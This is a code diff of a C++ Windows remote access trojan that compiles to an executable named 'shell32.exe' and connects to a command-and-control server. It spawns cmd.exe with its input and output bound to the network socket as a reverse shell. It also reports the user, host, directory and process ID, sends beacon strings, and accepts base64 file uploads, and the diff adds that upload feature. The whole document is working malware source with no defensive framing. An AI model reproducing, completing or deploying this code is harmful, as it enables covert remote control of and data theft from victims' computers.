@@ -15,35 +15,6 @@
 // to compile:
 // i686-w64-mingw32-g++ wsarev.cpp -o shell32.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 
-// We can try and use two iterations of this shell. Keep it in an "inactive state" where batch-commands (using Shell), profiling/information-gathering,
-// and beaconing is possible. This will preferably use the WINAPI functions (stealthy?). Then, we can implement the 'interaction' part of the shell, 
-// in which the cmd.exe process is executes.
-
-// Pseudo-code/outline
-/* 
-start program:
-    start socket, init connection
-    listen for incoming data: if cant connect retry in random interval range 5-40 seconds
-        if data = shell:
-            spawn cmd.exe 
-            -> upon exit, close process. 
-            -> send message saying process closed (C2 catches message and closes interaction successfully)
-        else if data = batch:
-            start secondary listener for follow-up data (ie. commands for shell exec, profiling)
-            wait for 'quit' message which exits listening 'loop?'
-        else if data = exit:
-            kill socket
-            kill process
-            exit(0)
-        else if data = info:
-            get user, hostname, process name, users logged in, ip address, domain name, etc.
-            make pretty
-            send home
-        
-Notes and Questions:
-    - How much of this is can be done with the WinAPI?
-    - 
-*/
 
 //# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 //# ======================================================================================================================================================================================
@@ -55,6 +26,19 @@ Notes and Questions:
 // - ls
 // - sleep (lie dormant for x amount of time: close socket, stop beaconing, etc.)
 
+int upload(char *filename, char *content){
+	errno = 0;
+	FILE *outfile;
+	outfile = fopen(filename, "w");
+	if (!outfile) {
+		return errno;
+	}
+	else {
+		fwrite(content,strlen(content),1,outfile);
+		fclose(outfile);
+		return 0;
+	}
+}
 void whoami(char *returnval, int returnsize)
 {
     DWORD bufferlen = 257;
@@ -136,22 +120,26 @@ void RAT(char* C2_Server, int C2_Port)
                 command = strtok(CommandReceived, delim);
 
                 // Should only be used in individual interactive environments == TBC
-                if ((strcmp(command, "aSB3YW50IHNoZWxsIG5vdw") == 0))
+                if ((strcmp(command, "shell") == 0))
                 {
+                    // Load CMD.EXE as a process var
                     char Process[] = "cmd.exe";
                     STARTUPINFO sinfo;
                     PROCESS_INFORMATION pinfo;
 
+                    // Allocate and execute
                     memset(&sinfo, 0, sizeof(sinfo));
                     sinfo.cb = sizeof(sinfo);
-                    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-                    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) tcp_sock;
+                    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);                  // Set flags
+                    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) tcp_sock;       // Redirect fd's to socket
 
+                    // Create process and attach the process var to it
                     CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
 
                     // We are here, hanging in the cmd.exe process until it is closed by a TERM or exit command
                     WaitForSingleObject(pinfo.hProcess, INFINITE); 
 
+                    // Cleanup correctly
                     CloseHandle(pinfo.hProcess);
                     CloseHandle(pinfo.hThread);
 
@@ -159,54 +147,74 @@ void RAT(char* C2_Server, int C2_Port)
 
                     // When the process exits, we send an agent-msg over to alert the C2
                     char buffer[64] = "";
-                    strcat(buffer,"[* Agent-Msg] Exiting shell\n");
+                    strcat(buffer,"Exiting shell\n");
+
+                    // Send message
                     send(tcp_sock,buffer,strlen(buffer) + 1, 0);
 
+                    // Clear buffers
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
                 else if ((strcmp(command, "UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt") == 0))
                 {
+                    // Load OS type into buffer
                     char buffer[257] = "";
                     strcat(buffer, "Windows");
                     //strcat(buffer, "\n");
+
+                    // Send message
                     send(tcp_sock, buffer, strlen(buffer) + 1, 0);
 
+                    // Clear buffers
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
                 else if ((strcmp(command, "whoami") == 0))
                 {
+                    // Load buffer, exec Whoami function and load output into buffer
                     char buffer[257] = "";
                     whoami(buffer, 257);
                     strcat(buffer, "\n");
+
+                    // send message
                     send(tcp_sock, buffer, strlen(buffer) + 1, 0);
 
+                    // Clear buffers
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
                 else if ((strcmp(command, "hostname") == 0))
                 {
+                    // Load buffer, exec Hostname function
                     char buffer[257] = "";
                     hostname(buffer, 257);
                     strcat(buffer, "\n");
+
+                    // Send message
                     send(tcp_sock, buffer, strlen(buffer) + 1, 0);
 
+                    // Clear buffers
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
                 else if ((strcmp(command, "pwd") == 0))
                 {
+                    // Load buffer, exec PrintWorkingDirectory (PWD) function
                     char buffer[257] = "";
                     pwd(buffer, 257);
                     strcat(buffer, "\n");
+
+                    // Send message
                     send(tcp_sock, buffer, strlen(buffer) + 1, 0);
 
+                    // Clear buffers
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
                 else if ((strcmp(command, "getpid") == 0))
                 {   
+                    // Exec function, load output into var
                     DWORD pid;
                     char char_pid[6];
                     pid = getpid();
@@ -214,35 +222,49 @@ void RAT(char* C2_Server, int C2_Port)
                     // Convert DWORD to char (using base 10)
                     _ultoa(pid,char_pid,10);
 
+                    // Load message
                     char buffer[20] = "";
                     strcat(buffer, "Current PID: ");
                     strcat(buffer, char_pid);
                     strcat(buffer, "\n");
+
+                    // Send message
                     send(tcp_sock, buffer, strlen(buffer) + 1, 0);
 
+                    // Clear buffers
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
                 else if (strcmp(command, "ping") == 0)
                 {
+                    // Send intelligent reply
                     char buffer[64] = "";
-                    strcat(buffer,"[*Agent-msg] PONG\n");
+                    strcat(buffer,"PONG\n");
                     send(tcp_sock,buffer,strlen(buffer) + 1, 0);
 
+                    // Clear buffers
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
 			    }
                 else if (strcmp(command, "beacon") == 0)
                 {
+                    // Send beacon string to show success
                     char buffer[128] = "";
                     strcat(buffer,"d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy");
                     send(tcp_sock,buffer,strlen(buffer) + 1, 0);
 
+                    // Clear buffers
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
 			    }
                 else if (strcmp(command, "exit") == 0)
                 {
+                    // Send return code - OK
+                    char buffer[64] = "";
+                    strcat(buffer,"c2xlZXBpbmc");
+                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);
+
+                    // Close connection, Kill process
                     closesocket(tcp_sock);
                     WSACleanup();
                     std::cout << "Socket killed. WSA Cleaned. Sleep Start" << std::endl;
@@ -252,6 +274,10 @@ void RAT(char* C2_Server, int C2_Port)
                 }
                 else if (strcmp(command, "kill") == 0) 
                 {
+                    char buffer[64] = "";
+                    strcat(buffer,"ZGVhZA");
+                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);
+
                     closesocket(tcp_sock);
                     WSACleanup();
                     std::cout << "Socket killed. WSA Cleaned. Sleep Start" << std::endl;
@@ -259,12 +285,74 @@ void RAT(char* C2_Server, int C2_Port)
                     std::cout << "Dying..." << std::endl;
                     exit(0);
 			    }
+                else if (strcmp(command, "upload") == 0) {
+			
+                    char * filename = strtok(NULL, delim);
+                    char * data_length = strtok(NULL, delim);
+                    int data_length_int = atoi(data_length);
+                    
+                    // receiving data
+                    char base64file[data_length_int];
+                    memset(base64file, 0, sizeof(base64file));
+                    
+                    char buffer[255] = "";
+                    strcat(buffer, "[!] Saving file in Base64 format as ");
+                    strcat(buffer, filename);
+                    strcat(buffer, "\n");
+                    strcat(buffer, "    Decode it using:\n\n\tcertutil -decode c:\\foo.asc c:\\foo.exe");
+                    strcat(buffer, "    \n\tOR\n\tcat foo.asc | base64 -d > foo");
+
+                    
+                    send(tcp_sock, buffer, strlen(buffer)+1,0); // send response
+                    
+                    int recv_result = recv(tcp_sock, base64file, data_length_int, 0);
+
+                    if (recv_result <= 0)
+                    {
+                        closesocket(tcp_sock);
+                        std::cout << "Error received during upload procedure. Socket killed. Sleep Start" << std::endl;
+                        Sleep(1000);
+                        std::cout << "Returning to loop..." << std::endl;     
+                        break;               
+                    }
+
+                    // uploading
+                    int file_result;
+                    file_result = upload(filename,base64file);
+                    
+                    // C&C part
+                    memset(buffer, 0, sizeof(buffer));
+                    if (file_result == 0) {
+                        strcat(buffer,"\n[+] Uploaded: "); 
+                        strcat(buffer,filename); 
+                    }
+                    else { 
+                        strcat(buffer,"\n[-] Failed to write file. Errno from fopen: "); 
+
+                        // parse errno
+                        char errnos[2];
+                        memset(errnos,0,2);
+                        _itoa(file_result,errnos,10);
+                        strcat(buffer,errnos);
+                    }
+                    strcat(buffer,"\n");
+                    
+                    // Send result info
+                    send(tcp_sock,buffer,strlen(buffer)+1,0);
+
+                    // Clear buffers
+                    memset(base64file, 0, sizeof(base64file));
+                    memset(buffer, 0, sizeof(buffer));
+                    memset(CommandReceived, 0, sizeof(CommandReceived)); 
+                }
                 else
                 {
+                    // Send notice of validity
                     char buffer[64] = "";
-                    strcat(buffer,"[* Agent-Msg] Invalid Command\n");
+                    strcat(buffer,"Invalid Command\n");
                     send(tcp_sock,buffer,strlen(buffer) + 1, 0);
 
+                    // Clear buffers
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
